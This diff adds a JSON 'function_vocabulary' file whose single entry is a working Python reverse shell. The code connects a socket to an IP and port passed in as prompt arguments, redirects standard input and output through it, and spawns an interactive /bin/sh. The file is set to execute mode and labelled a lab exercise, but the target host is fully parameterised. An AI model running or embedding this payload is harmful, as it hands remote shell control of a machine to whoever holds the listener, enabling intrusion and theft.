@@ -1,0 +1,8 @@
+{
+  "_type": "function_vocabulary",
+  "_grammar": "revshell_param",
+  "_exec": "python",
+  "_mode": "execute",
+  "_description": "LAB: parameterized reverse shell. Logic in the model; TARGET (ip, port) from prompt args (args[0], args[1]). Run only against your own listener.",
+  "connect_shell": "import socket, subprocess, os\nip = args[0] if args else '127.0.0.1'\nport = int(args[1]) if len(args) > 1 else 1234\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((ip, port))\nos.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/sh', '-i'])"
+}
